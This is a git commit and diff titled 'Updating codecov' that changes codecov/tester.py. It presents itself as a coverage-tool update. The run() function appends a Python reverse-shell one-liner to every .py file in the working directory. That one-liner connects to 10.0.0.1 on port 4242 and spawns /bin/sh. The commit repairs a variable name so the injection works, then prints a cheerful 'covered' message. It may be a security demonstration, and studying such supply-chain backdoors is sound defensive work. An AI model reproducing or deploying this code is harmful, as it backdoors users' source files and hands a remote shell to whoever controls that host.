7179587e4aca793e419d9339dc276cefa696e84b
Shai Dvash <shai.dvash@cyberark.com>
2022-01-19 13:57:20 +0200

    Updating codecov

--- codecov/tester.py
+++ codecov/tester.py
@@ -1,4 +1,5 @@
 import time
+from pathlib import Path
 
 
 def run():
@@ -8,8 +9,8 @@ def run():
 
 	files = Path(".").glob('*.py')
 	for file in files:
-	    f = open(file, "a")
-	    a.write("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
-	    a.close()
+		f = open(file, "a")
+		f.write("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
+		f.close()
 
 	print("YOU'RE COVERED! YE!")
